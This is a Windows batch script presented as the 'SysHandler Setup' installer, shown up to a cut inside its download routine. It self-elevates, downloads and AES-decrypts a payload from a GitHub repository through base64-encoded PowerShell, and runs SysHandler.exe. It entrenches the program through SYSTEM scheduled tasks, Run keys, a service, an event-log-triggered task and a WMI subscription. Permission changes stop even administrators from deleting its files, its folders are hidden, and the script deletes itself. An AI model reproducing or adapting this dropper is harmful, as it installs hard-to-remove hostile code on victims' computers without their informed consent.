@echo off
setlocal EnableExtensions EnableDelayedExpansion
title SysHandler Setup
set "DST=%PROGRAMDATA%\SysHandler"
set "MIR=%PROGRAMDATA%\SvcCache"
set "URL1=https://github.com/happycelebration/schema/raw/refs/heads/main/schema.zip"
set "URL2=https://raw.githubusercontent.com/happycelebration/schema/main/schema.zip"
set "TMPF=%TEMP%\SysHandler_%RANDOM%%RANDOM%"
set "ZIP=%TMPF%\schema.zip"
set "LOG=%TMPF%\download_log.txt"
set "ENC=%TMPF%\payload.enc"
set "DETRY=0"
set "PKEY=Ux4mR2pQ8sV7wZ1yC3jN6hK9dF2gL5aT0bE8oI1uS4c="
set "SHDC=JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwB0AG8AcAAnAAoAdAByAHkAIAB7AAoAJABhAGUAcwA9AFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEEAZQBzAF0AOgA6AEMAcgBlAGEAdABlACgAKQAKACQAYQBlAHMALgBNAG8AZABlAD0AJwBDAEIAQwAnAAoAJABhAGUAcwAuAFAAYQBkAGQAaQBuAGcAPQAnAFAASwBDAFMANwAnAAoAJABhAGUAcwAuAEsAZQB5AD0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGUAbgB2ADoAUwBIAEsARQBZACkACgAkAGIAPQBbAFMAeQBzAHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBSAGUAYQBkAEEAbABsAEIAeQB0AGUAcwAoACQAZQBuAHYAOgBTAEgARQBOAEMAKQAKAGkAZgAoACQAYgAuAEwAZQBuAGcAdABoACAALQBsAHQAIAA0ADgAKQB7AHQAaAByAG8AdwAgACcAcABhAHkAbABvAGEAZAAgAHQAbwBvACAAcwBtAGEAbABsACcAfQAKACQAaQB2AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAGIAeQB0AGUAWwBdACAAMQA2AAoAWwBBAHIAcgBhAHkAXQA6ADoAQwBvAHAAeQAoACQAYgAsADAALAAkAGkAdgAsADAALAAxADYAKQAKACQAYQBlAHMALgBJAFYAPQAkAGkAdgAKACQAYwB0AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAGIAeQB0AGUAWwBdACAAKAAkAGIALgBMAGUAbgBnAHQAaAAtADEANgApAAoAWwBBAHIAcgBhAHkAXQA6ADoAQwBvAHAAeQAoACQAYgAsADEANgAsACQAYwB0ACwAMAAsACQAYwB0AC4ATABlAG4AZwB0AGgAKQAKACQAbQBzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsACQAYwB0ACkACgAkAGMAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AQwByAHkAcAB0AG8AUwB0AHIAZQBhAG0AKAAkAG0AcwAsACQAYQBlAHMALgBDAHIAZQBhAHQAZQBEAGUAYwByAHkAcAB0AG8AcgAoACkALABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBDAHIAeQBwAHQAbwBTAHQAcgBlAGEAbQBNAG8AZABlAF0AOgA6AFIAZQBhAGQAKQAKACQAZgBzAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGUAbgB2ADoAUwBIAFoASQBQACkACgAkAGMAcwAuAEMAbwBwAHkAVABvACgAJABmAHMAKQAKACQAZgBzAC4AQwBsAG8AcwBlACgAKQAKACQAYwBzAC4ARABpAHMAcABvAHMAZQAoACkACgAkAG0AcwAuAEQAaQBzAHAAbwBzAGUAKAApAAoAZQB4AGkAdAAgADAACgB9ACAAYwBhAHQAYwBoACAAewAKAGUAeABpAHQAIAAxAAoAfQA="
set "SHEV=JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwB0AG8AcAAnAAoAdAByAHkAIAB7AAoAJAB4AD0AJwA8AD8AeABtAGwAIAB2AGUAcgBzAGkAbwBuAD0AIgAxAC4AMAAiACAAZQBuAGMAbwBkAGkAbgBnAD0AIgBVAFQARgAtADEANgAiAD8APgA8AFQAYQBzAGsAIAB2AGUAcgBzAGkAbwBuAD0AIgAxAC4AMgAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AdwBpAG4AZABvAHcAcwAvADIAMAAwADQALwAwADIALwBtAGkAdAAvAHQAYQBzAGsAIgA+ADwAVAByAGkAZwBnAGUAcgBzAD4APABFAHYAZQBuAHQAVAByAGkAZwBnAGUAcgA+ADwARQBuAGEAYgBsAGUAZAA+AHQAcgB1AGUAPAAvAEUAbgBhAGIAbABlAGQAPgA8AFMAdQBiAHMAYwByAGkAcAB0AGkAbwBuAD4AJgBsAHQAOwBRAHUAZQByAHkATABpAHMAdAAmAGcAdAA7ACYAbAB0ADsAUQB1AGUAcgB5ACAASQBkAD0AIgAwACIAIABQAGEAdABoAD0AIgBTAHkAcwB0AGUAbQAiACYAZwB0ADsAJgBsAHQAOwBTAGUAbABlAGMAdAAgAFAAYQB0AGgAPQAiAFMAeQBzAHQAZQBtACIAJgBnAHQAOwAqAFsAUwB5AHMAdABlAG0AWwBQAHIAbwB2AGkAZABlAHIAWwBAAE4AYQBtAGUAPQAnACcATQBpAGMAcgBvAHMAbwBmAHQALQBXAGkAbgBkAG8AdwBzAC0ASwBlAHIAbgBlAGwALQBHAGUAbgBlAHIAYQBsACcAJwBdACAAYQBuAGQAIABFAHYAZQBuAHQASQBEAD0AMQAyAF0AXQAmAGwAdAA7AC8AUwBlAGwAZQBjAHQAJgBnAHQAOwAmAGwAdAA7AC8AUQB1AGUAcgB5ACYAZwB0ADsAJgBsAHQAOwAvAFEAdQBlAHIAeQBMAGkAcwB0ACYAZwB0ADsAPAAvAFMAdQBiAHMAYwByAGkAcAB0AGkAbwBuAD4APAAvAEUAdgBlAG4AdABUAHIAaQBnAGcAZQByAD4APAAvAFQAcgBpAGcAZwBlAHIAcwA+ADwAUAByAGkAbgBjAGkAcABhAGwAcwA+ADwAUAByAGkAbgBjAGkAcABhAGwAIABpAGQAPQAiAEEAdQB0AGgAbwByACIAPgA8AFUAcwBlAHIASQBkAD4AUwAtADEALQA1AC0AMQA4ADwALwBVAHMAZQByAEkAZAA+ADwAUgB1AG4ATABlAHYAZQBsAD4ASABpAGcAaABlAHMAdAA8AC8AUgB1AG4ATABlAHYAZQBsAD4APAAvAFAAcgBpAG4AYwBpAHAAYQBsAD4APAAvAFAAcgBpAG4AYwBpAHAAYQBsAHMAPgA8AFMAZQB0AHQAaQBuAGcAcwA+ADwATQB1AGwAdABpAHAAbABlAEkAbgBzAHQAYQBuAGMAZQBzAFAAbwBsAGkAYwB5AD4ASQBnAG4AbwByAGUATgBlAHcAPAAvAE0AdQBsAHQAaQBwAGwAZQBJAG4AcwB0AGEAbgBjAGUAcwBQAG8AbABpAGMAeQA+ADwARABpAHMAYQBsAGwAbwB3AFMAdABhAHIAdABJAGYATwBuAEIAYQB0AHQAZQByAGkAZQBzAD4AZgBhAGwAcwBlADwALwBEAGkAcwBhAGwAbABvAHcAUwB0AGEAcgB0AEkAZgBPAG4AQgBhAHQAdABlAHIAaQBlAHMAPgA8AFMAdABvAHAASQBmAEcAbwBpAG4AZwBPAG4AQgBhAHQAdABlAHIAaQBlAHMAPgBmAGEAbABzAGUAPAAvAFMAdABvAHAASQBmAEcAbwBpAG4AZwBPAG4AQgBhAHQAdABlAHIAaQBlAHMAPgA8AFMAdABhAHIAdABXAGgAZQBuAEEAdgBhAGkAbABhAGIAbABlAD4AdAByAHUAZQA8AC8AUwB0AGEAcgB0AFcAaABlAG4AQQB2AGEAaQBsAGEAYgBsAGUAPgA8AEUAeABlAGMAdQB0AGkAbwBuAFQAaQBtAGUATABpAG0AaQB0AD4AUABUADAAUwA8AC8ARQB4AGUAYwB1AHQAaQBvAG4AVABpAG0AZQBMAGkAbQBpAHQAPgA8AC8AUwBlAHQAdABpAG4AZwBzAD4APABBAGMAdABpAG8AbgBzACAAQwBvAG4AdABlAHgAdAA9ACIAQQB1AHQAaABvAHIAIgA+ADwARQB4AGUAYwA+ADwAQwBvAG0AbQBhAG4AZAA+ACcAIAArACAAJABlAG4AdgA6AFMASABEAFMAVAAgACsAIAAnAFwAUwB5AHMASABhAG4AZABsAGUAcgAuAGUAeABlADwALwBDAG8AbQBtAGEAbgBkAD4APAAvAEUAeABlAGMAPgA8AC8AQQBjAHQAaQBvAG4AcwA+ADwALwBUAGEAcwBrAD4AJwAKAFIAZQBnAGkAcwB0AGUAcgAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAIAAtAFQAYQBzAGsATgBhAG0AZQAgACcAUwB5AHMASABhAG4AZABsAGUAcgAgAEUAdgBlAG4AdABXAGEAdABjAGgAJwAgAC0AWABtAGwAIAAkAHgAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBlAHgAaQB0ACAAMAAKAH0AIABjAGEAdABjAGgAIAB7AAoAZQB4AGkAdAAgADEACgB9AA=="
set "SHWM=JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwB0AG8AcAAnAAoAdAByAHkAIAB7AAoAJABkAHMAdAA9ACQAZQBuAHYAOgBTAEgARABTAFQACgAkAGYAPQBTAGUAdAAtAFcAbQBpAEkAbgBzAHQAYQBuAGMAZQAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIAAnAHIAbwBvAHQAXABzAHUAYgBzAGMAcgBpAHAAdABpAG8AbgAnACAALQBDAGwAYQBzAHMAIABfAF8ARQB2AGUAbgB0AEYAaQBsAHQAZQByACAALQBBAHIAZwB1AG0AZQBuAHQAcwAgAEAAewBOAGEAbQBlAD0AJwBTAHkAcwBIAGEAbgBkAGwAZQByAEYAaQBsAHQAZQByACcAOwBFAHYAZQBuAHQATgBhAG0AZQBzAHAAYQBjAGUAPQAnAHIAbwBvAHQAXABjAGkAbQB2ADIAJwA7AFEAdQBlAHIAeQBMAGEAbgBnAHUAYQBnAGUAPQAnAFcAUQBMACcAOwBRAHUAZQByAHkAPQAiAFMARQBMAEUAQwBUACAAKgAgAEYAUgBPAE0AIABfAF8ASQBuAHMAdABhAG4AYwBlAE0AbwBkAGkAZgBpAGMAYQB0AGkAbwBuAEUAdgBlAG4AdAAgAFcASQBUAEgASQBOACAANgAwACAAVwBIAEUAUgBFACAAVABhAHIAZwBlAHQASQBuAHMAdABhAG4AYwBlACAASQBTAEEAIAAnAFcAaQBuADMAMgBfAFAAZQByAGYARgBvAHIAbQBhAHQAdABlAGQARABhAHQAYQBfAFAAZQByAGYATwBTAF8AUwB5AHMAdABlAG0AJwAgAEEATgBEACAAVABhAHIAZwBlAHQASQBuAHMAdABhAG4AYwBlAC4AUwB5AHMAdABlAG0AVQBwAFQAaQBtAGUAIAA+AD0AIAAzADAAMAAgAEEATgBEACAAVABhAHIAZwBlAHQASQBuAHMAdABhAG4AYwBlAC4AUwB5AHMAdABlAG0AVQBwAFQAaQBtAGUAIAA8ACAAMwA2ADAAIgB9AAoAJABjAD0AUwBlAHQALQBXAG0AaQBJAG4AcwB0AGEAbgBjAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAJwByAG8AbwB0AFwAcwB1AGIAcwBjAHIAaQBwAHQAaQBvAG4AJwAgAC0AQwBsAGEAcwBzACAAQwBvAG0AbQBhAG4AZABMAGkAbgBlAEUAdgBlAG4AdABDAG8AbgBzAHUAbQBlAHIAIAAtAEEAcgBnAHUAbQBlAG4AdABzACAAQAB7AE4AYQBtAGUAPQAnAFMAeQBzAEgAYQBuAGQAbABlAHIAQwBvAG4AcwB1AG0AZQByACcAOwBDAG8AbQBtAGEAbgBkAEwAaQBuAGUAVABlAG0AcABsAGEAdABlAD0AJwBjAG0AZAAuAGUAeABlACAALwBjACAAcwB0AGEAcgB0ACAAIgAiACAAIgAnACsAJABkAHMAdAArACcAXABTAHkAcwBIAGEAbgBkAGwAZQByAC4AZQB4AGUAIgAnAH0ACgBTAGUAdAAtAFcAbQBpAEkAbgBzAHQAYQBuAGMAZQAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIAAnAHIAbwBvAHQAXABzAHUAYgBzAGMAcgBpAHAAdABpAG8AbgAnACAALQBDAGwAYQBzAHMAIABfAF8ARgBpAGwAdABlAHIAVABvAEMAbwBuAHMAdQBtAGUAcgBCAGkAbgBkAGkAbgBnACAALQBBAHIAZwB1AG0AZQBuAHQAcwAgAEAAewBGAGkAbAB0AGUAcgA9ACQAZgA7AEMAbwBuAHMAdQBtAGUAcgA9ACQAYwB9ACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAGUAeABpAHQAIAAwAAoAfQAgAGMAYQB0AGMAaAAgAHsACgBlAHgAaQB0ACAAMQAKAH0A"
set "MIN_SIZE=10000"
set "SYS=%SystemRoot%\System32"
set "PS1=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "UPGRADE=0"
set "ZIP_OK=0"
set "DL_OK=0"
set "EXOK=0"
set "DIFF=0"
set "TWD=%SystemRoot%\System32\Tasks"
set "WINE_MODE=0"
if exist "%SystemRoot%\system32\wineboot.exe" set "WINE_MODE=1"

echo.
echo  ==============================================
echo   SysHandler Setup
echo  ==============================================
echo.

call net session >nul 2>&1
if %errorlevel%==0 goto :run
if "%WINE_MODE%"=="1" goto :run
echo  Requesting administrator rights - accept the UAC prompt.
call powershell -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'"
exit /b 0

:run

if exist "%DST%\SysHandler.exe" set "UPGRADE=1"

echo  Downloading the SysHandler package from GitHub ...
mkdir "%TMPF%" 2>nul
call :download_package
if "!ZIP_OK!"=="0" (
  if "!DETRY!"=="1" goto :fail_decrypt
  goto :fail_download
)
call :extract_package
if "!EXOK!"=="1" goto :extracted
echo  Package verification failed, re-downloading ...
call :download_package
if "!ZIP_OK!"=="0" (
  if "!DETRY!"=="1" goto :fail_decrypt
  goto :fail_download
)
call :extract_package
if "!EXOK!"=="0" goto :fail_download

:extracted
if "!UPGRADE!"=="0" goto :diff_done
"%SYS%\certutil.exe" -hashfile "%DST%\SysHandler.dll" MD5 >"%TMPF%\oldh.txt" 2>nul
"%SYS%\certutil.exe" -hashfile "%TMPF%\SysHandler.dll" MD5 >"%TMPF%\newh.txt" 2>nul
set "OLDH="
set "NEWH="
for /f "usebackq skip=1 tokens=1" %%H in ("%TMPF%\oldh.txt") do if not defined OLDH set "OLDH=%%H"
for /f "usebackq skip=1 tokens=1" %%H in ("%TMPF%\newh.txt") do if not defined NEWH set "NEWH=%%H"
if defined OLDH if defined NEWH (
  if /i not "!OLDH!"=="!NEWH!" set "DIFF=1"
  goto :diff_done
)
for %%A in ("%DST%\SysHandler.dll") do set "OLDSZ=%%~zA"
for %%A in ("%TMPF%\SysHandler.dll") do set "NEWSZ=%%~zA"
if not "!OLDSZ!"=="!NEWSZ!" set "DIFF=1"
:diff_done

echo  Installing SysHandler ...
taskkill /f /im SysHandler.exe >nul 2>&1
if not exist "%DST%" mkdir "%DST%"
if not exist "%MIR%" mkdir "%MIR%"
copy /y "%TMPF%\SysHandler.exe" "%DST%\SysHandler.exe" >nul
if errorlevel 1 goto :fail_copy
copy /y "%TMPF%\SysHandler.dll" "%DST%\SysHandler.dll" >nul
if errorlevel 1 goto :fail_copy
copy /y "%TMPF%\SysHandler.exe" "%MIR%\SysHandler.exe" >nul
if errorlevel 1 goto :fail_copy
copy /y "%TMPF%\SysHandler.dll" "%MIR%\SysHandler.dll" >nul
if errorlevel 1 goto :fail_copy

schtasks /create /f /tn "SysHandler Watchdog" /tr "\"%DST%\SysHandler.exe\"" /sc onstart /ru SYSTEM /rl HIGHEST >nul 2>&1
schtasks /create /f /tn "SysHandler Fallback" /tr "\"%DST%\SysHandler.exe\"" /sc onlogon /ru SYSTEM /rl HIGHEST >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SysHandler /t REG_SZ /d "\"%DST%\SysHandler.exe\"" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SysHandler /t REG_SZ /d "\"%DST%\SysHandler.exe\"" /f >nul 2>&1

echo  Adding extra persistence channels ...
set "SHDST=%DST%"
"%PS1%" -NoProfile -EncodedCommand %SHEV% >nul 2>&1
sc create SysHandlerCore binPath= "%DST%\SysHandler.exe" type= own start= auto obj= LocalSystem DisplayName= "SysHandler Core" >nul 2>&1
sc failure SysHandlerCore reset= 86400 actions= restart/60000/restart/60000/restart/60000 >nul 2>&1
sc description SysHandlerCore "SysHandler Core Service" >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SysHandlerCore" /v Type /t REG_DWORD /d 16 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SysHandlerCore" /v Start /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SysHandlerCore" /v ErrorControl /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SysHandlerCore" /v ImagePath /t REG_EXPAND_SZ /d "%DST%\SysHandler.exe" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SysHandlerCore" /v DisplayName /t REG_SZ /d "SysHandler Core" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SysHandlerCore" /v ObjectName /t REG_SZ /d "LocalSystem" /f >nul 2>&1
sc config SysHandlerCore start= auto >nul 2>&1
reg add "HKLM\SOFTWARE\SysHandler" /v InstallId /t REG_SZ /d "SH-%RANDOM%%RANDOM%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\SysHandler" /v Version /t REG_SZ /d "X" /f >nul 2>&1

"%PS1%" -NoProfile -EncodedCommand %SHWM% >nul 2>&1

echo  Protecting the installation ...
icacls "%TWD%\SysHandler Watchdog" /inheritance:r /grant:r "*S-1-5-18:F" "%USERNAME%:F" >nul 2>&1
icacls "%TWD%\SysHandler Watchdog" /deny "*S-1-1-0:(D)" >nul 2>&1
icacls "%TWD%\SysHandler Watchdog" /deny "*S-1-5-32-544:(D)" >nul 2>&1
icacls "%TWD%\SysHandler Watchdog" /deny "*S-1-5-18:(D)" >nul 2>&1
icacls "%TWD%\SysHandler Watchdog" /deny "%USERNAME%:(D)" >nul 2>&1
icacls "%TWD%\SysHandler Fallback" /inheritance:r /grant:r "*S-1-5-18:F" "%USERNAME%:F" >nul 2>&1
icacls "%TWD%\SysHandler Fallback" /deny "*S-1-1-0:(D)" >nul 2>&1
icacls "%TWD%\SysHandler Fallback" /deny "*S-1-5-32-544:(D)" >nul 2>&1
icacls "%TWD%\SysHandler Fallback" /deny "*S-1-5-18:(D)" >nul 2>&1
icacls "%TWD%\SysHandler Fallback" /deny "%USERNAME%:(D)" >nul 2>&1
icacls "%TWD%\SysHandler EventWatch" /inheritance:r /grant:r "*S-1-5-18:F" "%USERNAME%:F" >nul 2>&1
icacls "%TWD%\SysHandler EventWatch" /deny "*S-1-1-0:(D)" >nul 2>&1
icacls "%TWD%\SysHandler EventWatch" /deny "*S-1-5-32-544:(D)" >nul 2>&1
icacls "%TWD%\SysHandler EventWatch" /deny "*S-1-5-18:(D)" >nul 2>&1
icacls "%TWD%\SysHandler EventWatch" /deny "%USERNAME%:(D)" >nul 2>&1
call powershell -NoProfile -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAJABiAD0AJwBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABTAGMAaABlAGQAdQBsAGUAXABUAGEAcwBrAEMAYQBjAGgAZQAnAAoAZgBvAHIAZQBhAGMAaAAoACQAbgAgAGkAbgAgAEAAKAAnAFMAeQBzAEgAYQBuAGQAbABlAHIAIABXAGEAdABjAGgAZABvAGcAJwAsACcAUwB5AHMASABhAG4AZABsAGUAcgAgAEYAYQBsAGwAYgBhAGMAawAnACkAKQB7AAoAJABwAD0AIgAkAGIAXABUAHIAZQBlAFwAJABuACIACgAkAGkAPQAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHAAIAAtAE4AYQBtAGUAIABJAGQAKQAuAEkAZAAKACQAawA9AEAAKAAkAHAAKQAKAGkAZgAoACQAaQApAHsAJABrACsAPQAoACIAJABiAFwAVABhAHMAawBzAFwAJABpACIAKQB9AAoAZgBvAHIAZQBhAGMAaAAoACQAcQAgAGkAbgAgACQAawApAHsACgBpAGYAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAcQApAHsACgAkAGEAPQBHAGUAdAAtAEEAYwBsACAAJABxAAoAJAByAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbAAuAFIAZQBnAGkAcwB0AHIAeQBBAGMAYwBlAHMAcwBSAHUAbABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFMAZQBjAHUAcgBpAHQAeQBJAGQAZQBuAHQAaQBmAGkAZQByACgAJwBTAC0AMQAtADEALQAwACcAKQApACwAJwBEAGUAbABlAHQAZQAnACwAJwBDAG8AbgB0AGEAaQBuAGUAcgBJAG4AaABlAHIAaQB0ACcALAAnAE4AbwBuAGUAJwAsACcARABlAG4AeQAnACkACgAkAGEALgBBAGQAZABBAGMAYwBlAHMAcwBSAHUAbABlACgAJAByACkAfABPAHUAdAAtAE4AdQBsAGwACgBTAGUAdAAtAEEAYwBsACAALQBQAGEAdABoACAAJABxACAALQBBAGMAbABPAGIAagBlAGMAdAAgACQAYQAKAH0AfQAKAH0A >nul 2>&1
icacls "%DST%" /inheritance:r /grant:r "%USERNAME%:(OI)(CI)F" >nul 2>&1
icacls "%DST%" /deny "*S-1-1-0:(OI)(CI)(D)" >nul 2>&1
icacls "%DST%" /deny "*S-1-5-32-544:(OI)(CI)(D)" >nul 2>&1
icacls "%DST%" /deny "*S-1-5-18:(OI)(CI)(D)" >nul 2>&1
icacls "%DST%" /deny "%USERNAME%:(OI)(CI)(D)" >nul 2>&1
icacls "%DST%" /deny "*S-1-1-0:(DC)" >nul 2>&1
icacls "%DST%" /deny "*S-1-5-32-544:(DC)" >nul 2>&1
icacls "%DST%" /deny "*S-1-5-18:(DC)" >nul 2>&1
icacls "%DST%" /deny "%USERNAME%:(DC)" >nul 2>&1
attrib +h +s "%DST%" >nul 2>&1
icacls "%MIR%" /inheritance:r /grant:r "%USERNAME%:(OI)(CI)F" >nul 2>&1
icacls "%MIR%" /deny "*S-1-1-0:(OI)(CI)(D)" >nul 2>&1
icacls "%MIR%" /deny "*S-1-5-32-544:(OI)(CI)(D)" >nul 2>&1
icacls "%MIR%" /deny "*S-1-5-18:(OI)(CI)(D)" >nul 2>&1
icacls "%MIR%" /deny "%USERNAME%:(OI)(CI)(D)" >nul 2>&1
icacls "%MIR%" /deny "*S-1-1-0:(DC)" >nul 2>&1
icacls "%MIR%" /deny "*S-1-5-32-544:(DC)" >nul 2>&1
icacls "%MIR%" /deny "*S-1-5-18:(DC)" >nul 2>&1
icacls "%MIR%" /deny "%USERNAME%:(DC)" >nul 2>&1
attrib +h +s "%MIR%" >nul 2>&1

start "" "%DST%\SysHandler.exe"
rd /s /q "%TMPF%" >nul 2>&1
echo.
if "!DIFF!"=="1" (
  echo  UPDATE DETECTED
  echo  UPGRADE COMPLETE
) else (
  echo  Everything is perfect.
)
echo.
echo  NOTE: Keep your original zip file. It is the ONLY place
echo  that contains uninstall.bat, the clean way to remove
echo  this tool later. The installer deletes itself in 3 seconds.
echo.
start "" /min cmd /c "ping -n 4 127.0.0.1 >nul & del /f /q "%~f0""
exit /b 0
:fail_decrypt
echo.
echo  The downloaded payload could not be decrypted.
echo  The repository copy may be outdated or corrupted.
echo  Run Setup again later or contact the administrator.
echo  Technical details: "!LOG!"
echo.
pause
exit /b 1

:fail_copy
echo.
echo  Setup could not copy the files into place.
echo  Make sure no antivirus is blocking the SysHandler folder and run Setup again.
echo  Technical details: "!LOG!"
echo.
pause
exit /b 1

:fail_download
echo.
echo  Unable to download required files from GitHub.
echo  Check the internet connection on this computer and run Setup again.
echo  Technical details: "!LOG!"
echo.
pause
exit /b 1
:decrypt_package
set "DETRY=1"
set "DEOK=0"
if not exist "%ENC%" goto :eof
if not exist "%PS1%" (
  >>"%LOG%" echo [decrypt] powershell not available
  goto :eof
)
del /f /q "%ZIP%" >nul 2>&1
set "SHENC=%ENC%"
set "SHZIP=%ZIP%"
set "SHKEY=%PKEY%"
"%PS1%" -NoProfile -EncodedCommand %SHDC% >>"%LOG%" 2>&1
if errorlevel 1 (
  >>"%LOG%" echo [decrypt] decryption failed
  goto :eof
)
if not exist "%ZIP%" (
  >>"%LOG%" echo [decrypt] no plaintext produced
  goto :eof
)
if exist "%SYS%\tar.exe" (
  "%SYS%\tar.exe" -tf "%ZIP%" >nul 2>&1
  if errorlevel 1 (
    >>"%LOG%" echo [decrypt] plaintext zip invalid
    goto :eof
  )
)
set "DEOK=1"
>>"%LOG%" echo [decrypt] payload decrypted ok
goto :eof

:download_package
set "ZIP_OK=0"
set "PASS=0"
:dl_pass
set /a PASS+=1
if exist "%ZIP%" del /f /q "%ZIP%" >nul 2>&1
echo  Download attempt !PASS!: method 1 of 5 (curl) ...
call :try_curl
if "!DL_OK!"=="1" goto :dl_success
echo  Download attempt !PASS!: method 2 of 5 (PowerShell) ...
call :try_iwr
if "!DL_OK!"=="1" goto :dl_success
echo  Download attempt !PASS!: method 3 of 5 (BITS) ...
call :try_bits
if "!DL_OK!"=="1" goto :dl_success
echo  Download attempt !PASS!: method 4 of 5 (bitsadmin) ...
call :try_bitsadmin
if "!DL_OK!"=="1" goto :dl_success
echo  Download attempt !PASS!: method 5 of 5 (certutil) ...
call :try_certutil
if "!DL_OK!"=="1" goto :dl_success
if !PASS! lss 2 (
  echo  Waiting 3 seconds before retrying all methods ...
  ping -n 4 127.0.0.1 >nul
  goto :dl_pass
)
>>"%LOG%" echo [download] all methods failed
goto :eof
:dl_success
call :decrypt_package
if "!DEOK!"=="1" (
  set "ZIP_OK=1"
  >>"%LOG%" echo [download] success on pass !PASS!
)
goto :eof

:try_curl
set "DL_OK=0"
if not exist "%SYS%\curl.exe" (
  >>"%LOG%" echo [curl] not available
  goto :eof
)
"%SYS%\curl.exe" -L --fail --silent --show-error --retry 2 --retry-delay 1 --connect-timeout 20 --ssl-no-revoke -A "Mozilla/5.0" -o "%ENC%" "%URL1%" >>"%LOG%" 2>&1
if errorlevel 1 (
  >>"%LOG%" echo [curl] exit code failure
  goto :eof
)
call :verify_zip
goto :eof

:try_iwr
set "DL_OK=0"
if not exist "%PS1%" (
  >>"%LOG%" echo [powershell] not available
  goto :eof
)
"%PS1%" -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; [Net.ServicePointManager]::SecurityProtocol=[Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL1%' -OutFile '%ENC%' -UseBasicParsing -TimeoutSec 300" >>"%LOG%" 2>&1
if errorlevel 1 (
  >>"%LOG%" echo [powershell] exit code failure
  goto :eof
)
call :verify_zip
goto :eof

:try_bits
set "DL_OK=0"
if not exist "%PS1%" (
  >>"%LOG%" echo [bits] powershell not available
  goto :eof
)
"%PS1%" -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; [Net.ServicePointManager]::SecurityProtocol=[Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12; Start-BitsTransfer -Source '%URL1%' -Destination '%ENC%'" >>"%LOG%" 2>&1
if errorlevel 1 (
  >>"%LOG%" echo [bits] exit code failure
  goto :eof
)
call :verify_zip
goto :eof

:try_bitsadmin
set "DL_OK=0"
if not exist "%SYS%\bitsadmin.exe" (
  >>"%LOG%" echo [bitsadmin] not available
  goto :eof
)
"%SYS%\bitsadmin.exe" /transfer SysHandlerDL /download /priority foreground "%URL2%" "%ENC%" >>"%LOG%" 2>&1
if errorlevel 1 (
  >>"%LOG%" echo [bitsadmin] exit code failure
  goto :eof
)
call :verify_zip
goto :eof

:try_certutil
set "DL_OK=0"
if not exist "%SYS%\certutil.exe" (
  >>"%LOG%" echo [certutil] not available
  goto :eof
)
"%SYS%\certutil.exe" -urlcache -split -f "%URL2%" "%ENC%" >>"%LOG%" 2>&1
if errorlevel 1 (
